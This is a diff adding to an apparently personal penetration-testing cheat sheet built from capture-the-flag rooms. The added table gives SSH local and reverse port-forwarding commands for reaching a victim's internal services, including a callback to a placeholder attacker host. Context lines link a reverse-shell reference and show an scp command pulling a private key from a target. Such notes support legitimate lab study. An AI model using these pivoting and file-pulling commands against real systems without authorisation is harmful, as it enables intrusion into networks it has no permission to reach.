@@ -36,3 +36,10 @@ This is a very good [reference](https://pentestmonkey.net/cheat-sheet/shells/rev
 **SCP (if SSH known)**
 
 `scp user@$IP:/remote/path ./local/` · *Basic Pentesting (kay's id_rsa), Agent Sudo (image)*
+
+#### SSH tunnelling (reach internal services)
+
+| Type | Flag | Purpose | Command | Example | When to Use |
+|------|------|---------|---------|---------|-------------|
+| Local Forward | `-L` | Bring an internal service on the victim to your local machine | `ssh -L <local_port>:<internal_ip>:<remote_port> user@target` | `ssh -L 8080:172.17.0.2:8080 aubreanna@target` then browse `http://127.0.0.1:8080` on attacker machine | When you have SSH creds on victim and want to reach a service only the victim can see (e.g. Jenkins on a Docker subnet `172.17.0.2`) |
+| Reverse Forward | `-R` | Expose your attacker port through victim back to you | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP` | Chillhack — internal web app on `:9001` | When you need the victim to call back to expose a port on your side |
